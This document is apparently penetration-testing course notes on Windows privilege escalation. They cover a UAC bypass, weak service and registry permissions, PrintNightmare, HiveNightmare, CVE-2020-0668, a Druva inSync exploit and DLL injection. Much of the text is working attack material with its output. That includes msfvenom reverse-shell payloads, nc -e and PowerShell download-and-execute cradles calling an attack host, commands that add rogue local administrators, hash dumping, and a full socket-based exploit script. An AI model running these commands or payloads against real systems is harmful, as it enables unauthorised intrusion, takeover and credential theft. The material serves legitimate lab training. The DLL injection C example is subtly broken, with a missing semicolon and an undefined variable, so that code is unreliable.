> The [UACME](https://github.com/hfiref0x/UACME) project maintains a list of UAC bypasses, including information on the affected Windows build number, the technique used, and if Microsoft has issued a security update to fix it. Let's use technique number 54, which is stated to work from Windows 10 build 14393. This technique targets the 32-bit version of the auto-elevating binary `SystemPropertiesAdvanced.exe`. There are many trusted binaries that Windows will allow to auto-elevate without the need for a UAC consent prompt.
>
> According to [this](https://egre55.github.io/system-properties-uac-bypass) blog post, the 32-bit version of `SystemPropertiesAdvanced.exe` attempts to load the non-existent DLL srrstr.dll, which is used by System Restore functionality.
>
> When attempting to locate a DLL, Windows will use the following search order.
>
> 1. The directory from which the application loaded.
> 2. The system directory `C:\Windows\System32` for 64-bit systems.
> 3. The 16-bit system directory `C:\Windows\System` (not supported on 64-bit systems)
> 4. The Windows directory.
> 5. Any directories that are listed in the PATH environment variable.

### **Reviewing Path Variable**

```powershell-session
PS C:\adip> cmd /c echo %PATH%
```

> We can potentially bypass UAC in this by using DLL hijacking by placing a malicious `srrstr.dll` DLL to `WindowsApps` folder, which will be loaded in an elevated context.

### **Generating Malicious srrstr.dll DLL**

```shell-session
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll
```

### **Starting Python HTTP Server on Attack Host**

```shell-session
sudo python3 -m http.server 8080
```

### **Downloading DLL Target**

```powershell-session
PS C:\adip>curl http://10.10.14.3:8080/srrstr.dll -O "C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll"
```

### **Starting nc Listener on Attack Host**

```shell-session
nc -lvnp 8443
```

### **Testing Connection**

> If we execute the malicious `srrstr.dll` file, we will receive a shell back showing normal user rights (UAC enabled). To test this, we can run the DLL using `rundll32.exe` to get a reverse shell connection.

```cmd-session
C:\adip> rundll32 shell32.dll,Control_RunDLL C:\Users\sarah\AppData\Local\Microsoft\WindowsApps\srrstr.dll
```

> Once we get a connection back, we'll see normal user rights.

```shell-session
nc -lnvp 8443

listening on [any] 8443 ...

connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 49789
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.


C:\Users\sarah> whoami /priv

whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### **Executing SystemPropertiesAdvanced.exe on Target Host**

> Before proceeding, we should ensure that any instances of the `rundll32` process from our previous execution have been terminated.

**On cmd:**

```cmd
C:\htb> tasklist /svc | findstr "rundll32"
rundll32.exe                  6300 N/A
rundll32.exe                  5360 N/A
rundll32.exe                  7044 N/A

C:\htb> taskkill /PID 7044 /F
SUCCESS: The process with PID 7044 has been terminated.

C:\htb> taskkill /PID 6300 /F
SUCCESS: The process with PID 6300 has been terminated.

C:\htb> taskkill /PID 5360 /F
SUCCESS: The process with PID 5360 has been terminated.
```

> Now, we can try the 32-bit version of `SystemPropertiesAdvanced.exe` from the target host.

**On cmd:**

```cmd
C:\adip> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe
```

### **Receiving Connection Back**

```shell-session
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.16] 50273
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami

whoami
winlpe-ws03\sarah


C:\Windows\system32>whoami /priv

whoami /priv
PRIVILEGES INFORMATION
----------------------
Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Disabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Disabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Disabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Disabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Disabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Disabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Disabled
SeTimeZonePrivilege                       Change the time zone                                               Disabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Disabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Disabled
```

> This is successful, and we receive an elevated shell that shows our privileges are available and can be enabled if needed.

## 2.Weak Permissions

> Permissions on Windows systems are complicated and challenging to get right. A slight modification in one place may introduce a flaw elsewhere. As penetration testers, we need to understand how permissions work in Windows and the various ways that misconfigurations can be leveraged to escalate privileges. The permissions-related flaws discussed in this section are relatively uncommon in software applications put out by large vendors (but are seen from time to time) but are common in third-party software from smaller vendors, open-source software, and custom applications. Services usually install with SYSTEM privileges, so leveraging a service permissions-related flaw can often lead to complete control over the target system. Regardless of the environment, we should always check for weak permissions and be able to do it both with the help of tools and manually in case we are in a situation where we don't have our tools readily available.

## Permissive File System ACLs

### **Running SharpUp**

> We can use [SharpUp](https://github.com/GhostPack/SharpUp/) from the GhostPack suite of tools to check for service binaries suffering from weak ACLs.

```powershell-session
PS C:\htb> .\SharpUp.exe audit
```

### **Checking Permissions with icacls**

> Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```powershell-session
PS C:\htb> icacls "C:\Program Files (x86)\PCProtect\SecurityService.exe"

C:\Program Files (x86)\PCProtect\SecurityService.exe BUILTIN\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\SYSTEM:(I)(F)
                                                     BUILTIN\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

### **Replacing Service Binary**

> This service is also startable by unprivileged users, so we can make a backup of the original binary and replace it with a malicious binary generated with `msfvenom`. It can give us a reverse shell as `SYSTEM`, or add a local admin user and give us full administrative control over the machine.

```cmd-session
C:\htb> cmd /c copy /Y SecurityService.exe "C:\Program Files (x86)\PCProtect\SecurityService.exe"
C:\htb> sc start SecurityService
```

## Weak Service Permissions

### **Reviewing SharpUp Again**

Let's check the `SharpUp` output again for any modifiable services. We see the `WindscribeService` is potentially misconfigured.

```cmd-session
C:\adip> SharpUp.exe audit
 
=== SharpUp: Running Privilege Escalation Checks ===
 
 
=== Modifiable Services ===
 
  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### **Checking Permissions with AccessChk**

```cmd-session
C:\adip> accesschk.exe /accepteula -quvcw WindscribeService
```

> Here we can see that all Authenticated Users have [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) rights over the service, which means full read/write control over it.

### **Check Local Admin Group**

```cmd-session
C:\adip> net localgroup administrators
```

### **Changing the Service Binary Path**

```cmd-session
C:\adip> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
```

### Stopping Service

```cmd-session
C:\adip> sc stop WindscribeService
```

### **Starting the Service**

```cmd-session
C:\htb> sc start WindscribeService
```

### Confirming Local Admin Group Addition

```cmd-session
C:\htb> net localgroup administrators
```

> Another notable example is the Windows [Update Orchestrator Service (UsoSvc)](https://docs.microsoft.com/en-us/windows/deployment/update/how-windows-update-works), which is responsible for downloading and installing operating system updates. It is considered an essential Windows service and cannot be removed. Since it is responsible for making changes to the operating system through the installation of security and feature updates, it runs as the all-powerful `NT AUTHORITY\SYSTEM` account. Before installing the security patch relating to [CVE-2019-1322](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-1322), it was possible to elevate privileges from a service account to `SYSTEM`. This was due to weak permissions, which allowed service accounts to modify the service binary path and start/stop the service.

## Weak Service Permissions - Cleanup

### **Reverting the Binary Path**

```cmd-session
sc config WindScribeService binpath="c:\Program Files (x86)\Windscribe\WindscribeService.exe"
```

### Starting the Service Again

```cmd-session
sc start WindScribeService
```

### **Verifying Service is Running**

```cmd-session
sc query WindScribeService
```

***

## Unquoted Service Path

> When a service is installed, the registry configuration specifies a path to the binary that should be executed on service start. If this binary is not encapsulated within quotes, Windows will attempt to locate the binary in different folders. Take the example binary path below.

### **Service Binary Path**

```shell-session
C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
```

> Windows will decide the execution method of a program based on its file extension, so it's not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:
>
> * `C:\Program`
> * `C:\Program Files`
> * `C:\Program Files (x86)\System`
> * `C:\Program Files (x86)\System Explorer\service\SystemExplorerService64`

### Querying Service

```cmd-session
C:\htb> sc qc SystemExplorerHelpService
```

> If we can create the following files, we would be able to hijack the service binary and gain command execution in the context of the service, in this case, `NT AUTHORITY\SYSTEM`.
>
> * `C:\Program.exe\`
> * `C:\Program Files (x86)\System.exe`
>
> However, creating files in the root of the drive or the program files folder requires administrative privileges. Even if the system had been misconfigured to allow this, the user probably wouldn't be able to restart the service and would be reliant on a system restart to escalate privileges. Although it's not uncommon to find applications with unquoted service paths, it isn't often exploitable.

### Searching for Unquoted Service Paths

```cmd-session
C:\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
```

## Permissive Registry ACLs

### Checking for Weak Service ACLs in Registry

```cmd-session
C:\htb> accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
```

### **Changing ImagePath with PowerShell**

```powershell-session
 Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```

***

## Modifiable Registry Autorun Binary

### Check Startup Programs

```powershell-session
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl
```

> This [post](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html) and [this site](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2) detail many potential autorun locations on Windows systems.

***

## 3.Kernel Exploits

## Notable Vulnerabilities

> Over the years, there have been many high-impact Windows vulnerabilities that can be leveraged to escalate privileges, some being purely local privilege escalation vectors and others being remote code execution (RCE) flaws that can be used to escalate privileges by forwarding a local port. One example of the latter would be landing on a box that does not allow access to port 445 from the outside, performing port forward to access this port from our attack box, and leveraging a remote code execution flaw against the SMB service to escalate privileges. Below are some extremely high-impact Windows vulnerabilities over the years that can be leveraged to escalate privileges.
>
> `MS08-067` - This was a remote code execution vulnerability in the "Server" service due to improper handling of RPC requests. This affected Windows Server 2000, 2003, and 2008 and Windows XP and Vista and allows an unauthenticated attacker to execute arbitrary code with SYSTEM privileges. Though typically encountered in client environments as a remote code execution vulnerability, we may land on a host where the SMB service is blocked via the firewall. We can use this to escalate privileges after forwarding port 445 back to our attack box. Though this is a "legacy" vulnerability, I still do see this pop up from time to time in large organizations, especially those in the medical industry who may be running specific applications that only work on older versions of Windows Server/Desktop. We should not discount older vulnerabilities even in 2021. We will run into every scenario under the sun while performing client assessments and must be ready to account for all possibilities. The box [Legacy](https://0xdf.gitlab.io/2019/02/21/htb-legacy.html) on the Hack The Box platform showcases this vulnerability from the remote code execution standpoint. There are standalone as well as a Metasploit version of this exploit.
>
> `MS17-010` - Also known as [EternalBlue](https://en.wikipedia.org/wiki/EternalBlue) is a remote code execution vulnerability that was part of the FuzzBunch toolkit released in the [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) leak. This exploit leverages a vulnerability in the SMB protocol because the SMBv1 protocol mishandles packets specially crafted by an attacker, leading to arbitrary code execution on the target host as the SYSTEM account. As with MS08-067, this vulnerability can also be leveraged as a local privilege escalation vector if we land on a host where port 445 is firewalled off. There are various versions of this exploit for the Metasploit Framework as well as standalone exploit scripts. This attack was showcased in the [Blue](https://0xdf.gitlab.io/2021/05/11/htb-blue.html) box on Hack The Box, again from the remote standpoint.
>
> `ALPC Task Scheduler 0-Day` - The ALPC endpoint method used by the Windows Task Scheduler service could be used to write arbitrary DACLs to `.job` files located in the `C:\Windows\tasks` directory. An attacker could leverage this to create a hard link to a file that the attacker controls. The exploit for this flaw used the [SchRpcSetSecurity](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-tsch/a8172c11-a24a-4ad9-abd0-82bcf29d794d?redirectedfrom=MSDN) API function to call a print job using the XPS printer and hijack the DLL as NT AUTHORITY\SYSTEM via the Spooler service. An in-depth writeup is available [here](https://web.archive.org/web/20250303161707/https://blog.grimm-co.com/2020/05/alpc-task-scheduler-0-day.html). The Hack The Box box [Hackback](https://snowscan.io/htb-writeup-hackback/) can be used to try out this privilege escalation exploit.
>
> Summer of 2021 revealed a treasure trove of new Windows and Active Directory-related remote code execution and local privilege escalation flaws to the delight of penetration testers (and real-world attackers), and I'm sure groans from our hard-working colleagues on the defense side of things.
>
> `CVE-2021-36934 HiveNightmare, aka SeriousSam` is a Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level. Researchers quickly developed a PoC exploit to allow reading of the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py. More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare/tree/master/Release) exploit binary can be used to create copies of the three files to our working directory. This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.

## Checking Permissions on the SAM File

```cmd-session
icacls c:\Windows\System32\config\SAM
```

### Performing Attack and Parsing Password Hashes

> This [PoC](https://github.com/GossiTheDog/HiveNightmare) can be used to perform the attack, creating copies of the aforementioned registry hives:

```powershell-session
PS C:\Users\htb-student\Desktop> .\HiveNightmare.exe
```

> These copies can then be transferred back to the attack host, where impacket-secretsdump is used to extract the hashes:

```shell-session
impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

> `CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation. This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler. This right is typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely. The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system. The flaw affects every supported version of Windows, and being that the Print Spooler runs by default on Domain Controllers, Windows 7 and 10, and is often enabled on Windows servers, this presents a massive attack surface, hence "nightmare." Microsoft initially released a patch that did not fix the issue (and early guidance was to disable the Spooler service, which is not practical for many organizations) but released a second [patch](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) in July of 2021 along with guidance to check that specific registry settings are either set to `0` or not defined. Once this vulnerability was made public, PoC exploits were released rather quickly. [This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation. This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

### Checking for Spooler Service

```powershell-session
PS C:\htb> ls \\localhost\pipe\spoolss
```

### Adding Local Admin with PrintNightmare PowerShell PoC

> First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

> Now we can import the PowerShell script and use it to add a new local admin user.

```powershell-session
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```

### Confirming New Admin User

```powershell-session
PS C:\htb> net user hacker
```

***

## Enumerating Missing Patches

### Examining Installed Updates

```powershell-session
PS C:\htb> systeminfo
PS C:\htb> wmic qfe list brief
PS C:\htb> Get-Hotfix
```

### &#x20;**Viewing Installed Updates with WMI**

```cmd-session
C:\htb> wmic qfe list brief
```

> We can search for each KB (Microsoft Knowledge Base ID number) in the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/Search.aspx?q=KB5000808) to get a better idea of what fixes have been installed and how far behind the system may be on security updates. A search for `KB5000808` shows us that this is an update from March of 2021, which means the system is likely far behind on security updates.

## CVE-2020-0668 Example

### **Checking Current User Privileges**

```cmd-session
C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

### After Building Solution

> We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668, download it, and open it in Visual Studio within a VM. Building the solution should create the following files.

```shell-session
CVE-2020-0668.exe
CVE-2020-0668.exe.config
CVE-2020-0668.pdb
NtApiDotNet.dll
NtApiDotNet.xml
```

> At this point, we can use the exploit to create a file of our choosing in a protected folder such as C:\Windows\System32. We aren't able to overwrite any protected Windows files. This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.
>
> We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users. The (non-system protected) binary for this service is located below.
>
> * `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

### **Checking Permissions on Binary**

> `icacls` confirms that we only have read and execute permissions on this binary based on the line `BUILTIN\Users:(I)(RX)`

```cmd-session
icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

### **Generating Malicious Binary**

```shell-session
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.3 LPORT=8443 -f exe > maintenanceservice.exe
```

### Hosting the Malicious Binary

```shell-session
python3 -m http.server 8080
```

### Downloading the Malicious Binary

> For this step we need to make two copies of the malicious .exe file. We can just pull it over twice or do it once and make a second copy.
>
> We need to do this because running the exploit corrupts the malicious version of `maintenanceservice.exe` that is moved to (our copy in `c:\Users\htb-student\Desktop` that we are targeting) `c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe` which we will need to account for later. If we attempt to utilize the copied version, we will receive a `system error 216` because the .exe file is no longer a valid binary.

```powershell-session
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice.exe
PS C:\htb> wget http://10.10.15.244:8080/maintenanceservice.exe -O maintenanceservice2.exe
```

### Running the Exploit

```cmd-session
C:\htb> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\htb-student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

### Checking Permissions of New File

> The exploit runs and executing `icacls` again shows the following entry for our user: `WINLPE-WS02\htb-student:(F)`. This means that our htb-student user has full control over the maintenanceservice.exe binary, and we can overwrite it with a non-corrupted version of our malicious binary.

```cmd-session
C:\htb> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'
```

### Replacing File with Malicious Binary

> We can overwrite the `maintenanceservice.exe` binary in `c:\Program Files (x86)\Mozilla Maintenance Service` with a good working copy of our malicious binary created earlier before proceeding to start the service. In this example, we downloaded two copies of the malicious binary to `C:\Users\htb-student\Desktop`, `maintenanceservice.exe` and `maintenanceservice2.exe`. Let's move the good copy that was not corrupted by the exploit `maintenanceservice2.exe` to the Program Files directory, making sure to rename the file properly and remove the `2` or the service won't start. The `copy` command will only work from a cmd.exe window, not a PowerShell console.

```cmd-session
C:\htb> copy /Y C:\Users\htb-student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

### **Metasploit Resource Script**

> Next, save the below commands to a [Resource Script](https://docs.rapid7.com/metasploit/resource-scripts/) file named `handler.rc`.

```shell-session
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <our_ip>
set LPORT 8443
exploit
```

### Launching Metasploit with Resource Script

```shell-session
sudo msfconsole -r handler.rc
resource (handler.rc)> use exploit/multi/handler
resource (handler.rc)> set PAYLOAD windows/x64/meterpreter/reverse_https
PAYLOAD => windows/x64/meterpreter/reverse_https
resource (handler.rc)> set LHOST 10.10.14.3
resource (handler.rc)> set LPORT 8443
resource (handler.rc)> exploit
```

### Starting the Service

```cmd-session
C:\htb> net start MozillaMaintenance 
```

### Receiving a Meterpreter Session

```shell-session
meterpreter > getuid
meterpreter > sysinfo
meterpreter > hashdump
```

***

## 4.Vulnerable Services

> We may be able to escalate privileges on well-patched and well-configured systems if users are permitted to install software or vulnerable third-party applications/services are used throughout the organization. It is common to encounter a multitude of different applications and services on Windows workstations during our assessments. Let's look at an instance of a vulnerable service that we could come across in a real-world environment. Some services/applications may allow us to escalate to SYSTEM. In contrast, others could cause a denial-of-service condition or allow access to sensitive data such as configuration files containing passwords.

## **Enumerating Installed Programs**

```cmd-session
C:\htb> wmic product get name
```

> The output looks mostly standard for a Windows 10 workstation. However, the `Druva inSync` application stands out. A quick Google search shows that version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service. We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, we can see that Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.

### Enumerating Local Ports

```cmd-session
C:\htb> netstat -ano | findstr 6064
```

### **Enumerating Process ID**

```powershell-session
PS C:\htb> get-process -Id 3324
```

### **Enumerating Running Service**

```powershell-session
PS C:\htb> get-service | ? {$_.DisplayName -like 'Druva*'}
```

## Druva inSync Windows Client Local Privilege Escalation Example

### **Druva inSync PowerShell PoC**

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### **Modifying PowerShell PoC**

> For our purposes, we want to modify the `$cmd` variable to our desired command. We can do many things here, such as adding a local admin user (which is a bit noisy, and we want to avoid modifying things on client systems wherever possible) or sending ourselves a reverse shell. Let's try this with [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1). Download the script to our attack box, and rename it something simple like `shell.ps1`. Open the file, and append the following at the bottom of the script file (changing the IP to match our address and listening port as well):

```shell-session
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

> Modify the `$cmd` variable in the Druva inSync exploit PoC script to download our PowerShell reverse shell into memory.

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

### **Starting a Python Web Server**

```shell-session
python3 -m http.server 8080
```

### **Catching a SYSTEM Shell**

> Finally, start a `Netcat` listener on the attack box and execute the PoC PowerShell script on the target host (after [modifying the PowerShell execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy) with a command such as `Set-ExecutionPolicy Bypass -Scope Process`). We will get a reverse shell connection back with `SYSTEM` privileges if all goes to plan.

```shell-session
nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.43.7] 58611
Windows PowerShell running as user WINLPE-WS01$ on WINLPE-WS01
Copyright (C) 2015 Microsoft Corporation. All rights reserved.


PS C:\WINDOWS\system32>whoami

nt authority\system


PS C:\WINDOWS\system32> hostname

WINLPE-WS01
```

## 5.DLL Injection

> `DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This technique allows the inserted code to run within the process's context, thereby influencing its behavior or accessing its resources.
>
> `DLL injection` finds legitimate applications in various areas. For instance, software developers leverage this technology for `hot patching`, a method that enables the amendment or updating of code seamlessly, without the need to restart the ongoing process immediately. A prime example of this is [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), which facilitates the benefits of the update without necessitating server downtime.
>
> Nevertheless, it's not entirely innocuous. Cybercriminals often manipulate `DLL injection` to insert malicious code into trusted processes. This technique is particularly effective in evading detection by security software.
>
> There are several different methods for actually executing a DLL injection.

### LoadLibrary

> `LoadLibrary` is a widely utilized method for DLL injection, employing the `LoadLibrary` API to load the DLL into the target process's address space.
>
> The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

> The first example shows how `LoadLibrary` can be used to load a DLL into the current process legitimately.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

> The second example illustrates the use of `LoadLibrary` for DLL injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at `LoadLibrary` and directs towards the DLL path.

## Manual Mapping

> `Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and relocations. However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.
>
> A simplified outline of the process can be represented as follows:
>
> 1. Load the DLL as raw data into the injecting process.
> 2. Map the DLL sections into the targeted process.
> 3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

